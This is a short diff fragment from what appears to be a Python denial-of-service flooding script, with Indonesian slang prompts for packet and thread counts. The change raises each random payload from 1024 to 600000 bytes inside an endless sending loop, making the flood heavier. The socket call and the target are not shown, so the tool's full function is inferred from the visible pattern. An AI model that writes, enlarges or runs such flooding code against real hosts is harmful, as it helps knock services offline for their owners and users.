@@ -50,7 +50,7 @@ choice = str(input(" MAU CROT GAA?(y/n):"))
 times = int(input(" PACKETS CROT:"))
 threads = int(input(" THREAD CROT:"))
 def run():
-	data = random._urandom(1024)
+	data = random._urandom(600000)
 	i = random.choice(("[YAHMETE!!]","[YAHMETE!!]","[YAHMETE!!]"))
 	while True:
 		try:
